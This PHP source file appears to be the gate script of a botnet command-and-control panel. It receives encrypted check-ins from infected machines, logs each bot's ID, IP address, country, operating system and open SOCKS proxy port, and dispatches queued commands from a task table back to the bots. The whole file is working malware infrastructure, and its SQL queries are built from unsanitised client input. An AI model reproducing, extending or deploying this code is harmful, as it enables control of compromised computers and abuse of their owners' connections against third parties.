<?php
	/* Copyright © 2012 by Chrystal */
	
	if($_SERVER['REQUEST_METHOD'] !== 'POST') { die(); }
	
	require_once ('system/global.php');
	session_start();
	
	$Data = file_get_contents('php://input');	
	
	if (empty($_SESSION['KEY']))
	{
		$_SESSION['KEY'] = $Base->VisualDecrypt(rtrim(substr($Data, 46, 110)));
		
		if (isset($_SESSION['KEY']))
			SendReply(MESSAGE_INFO_SUCCESS, null);
		
		session_destroy();
	} else {
		$Data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $_SESSION['KEY'], $Data, MCRYPT_MODE_CBC);
		$pInfo = unpack('a38UID/LRate/LType', $Data);
		
		switch ($pInfo['Type'])
		{
			case 1:
			{
				$Data = unpack('a20System/LSocks/LVersion', substr($Data, 46, 58));
				$Data['Version'] = sprintf('%u.%u.%u.%u', (($Data['Version'] >> 24) & 0xFF), (($Data['Version'] >> 16) & 0xFF), (($Data['Version'] >> 8) & 0xFF), ($Data['Version'] & 0xFF));				
				$Data['IP'] = $_SERVER['REMOTE_ADDR'];
				$Data['Request'] = time();
				
				$GI = geoip_open('system/geoip/geoip.dat', GEOIP_STANDARD);
				$Data['Country'] = geoip_country_code_by_addr($GI, $Data['IP']);
				geoip_close($GI);
				
				$Data = array_merge($pInfo, $Data);
				
				if(!empty($Data['Socks']))
				{
					if(!($fSocket = @fsockopen($Data['IP'], intval($Data['Socks']), $errno, $errstr, ST_SOCK_CTIME)))
						$Data['Socks'] = '0';
					
					@fclose($fSocket);
				}
				
				$DB->Query("INSERT INTO clients (UID, IP, Country, System, Socks, Rate, Version, Request) VALUES ('{$Data['UID']}', '{$Data['IP']}', '{$Data['Country']}', 
						'{$Data['System']}', '{$Data['Socks']}', '{$Data['Rate']}', '{$Data['Version']}', '{$Data['Request']}')
							ON DUPLICATE KEY UPDATE IP = VALUES(IP), Country = VALUES(Country), System = VALUES(System), Socks = VALUES(Socks), Rate = VALUES(Rate), Version = VALUES(Version), Request = VALUES(Request);");
				
				SendReply(MESSAGE_INFO_SUCCESS, null);
			} break;
			
			case 2:
			{
				$Data = array('TID' => 0, 'CID' => MESSAGE_INFO_SUCCESS, 'CMD' => null, 'Request' => time());
				$Data = array_merge($pInfo, $Data);
				
				$Query = $DB->Query("
					SELECT 
					(
						SELECT t.TID FROM tasks AS t 
						WHERE t.time <= '{$Data['Request']}' AND ((
							t.elapsed > '{$Data['Request']}' 
						AND
							((SELECT COUNT(*) FROM clients WHERE TID = t.TID AND Request > '" . ($Data['Request'] - ST_BOT_TIME_ON) . "') < t.clients
							OR (v.TID = t.TID))
						) OR
							(t.elapsed = '0' AND (SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) < t.clients
						AND
							(SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID AND UID = v.UID) = '0'))
						ORDER BY t.elapsed
						LIMIT 0,1
					) AS TID FROM clients AS v WHERE v.UID = '{$Data['UID']}';");
				
				if($DB->NumRows($Query) > 0)
				{
					$nData = $DB->GetRowArray($Query);

					if(!empty($nData['TID']))
					{
						$Data['TID'] = $nData['TID'];
						
						$nTask = $DB->GetRowArray($DB->Query("SELECT elapsed, type, options FROM tasks WHERE TID = '{$Data['TID']}';"));
						
						$Data['CID'] = $nTask['type'];
						$Data['CMD'] = $nTask['options'];
						
						if(empty($nTask['elapsed'])) { $DB->Query("INSERT INTO tasks_done (TID, UID) VALUES ('{$Data['TID']}', '{$Data['UID']}');"); }
					}
					
					$DB->Query("UPDATE clients SET Request = '{$Data['Request']}', Rate = '{$Data['Rate']}', TID = '{$Data['TID']}' WHERE UID = '{$Data['UID']}';");
					SendReply($Data['CID'], $Data['CMD']);
				} else {
					session_destroy();
					SendReply(MESSAGE_INFO_FAILED, null);
				}
			} break;
		}
	}
	
	function SendReply($Type, $Data)
	{
		global $Base;
		
		$Packet = pack("La64", $Type, $Data);
		$Packet = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $_SESSION['KEY'], $Packet, MCRYPT_MODE_CBC);
		
		die($Packet);
	}
?>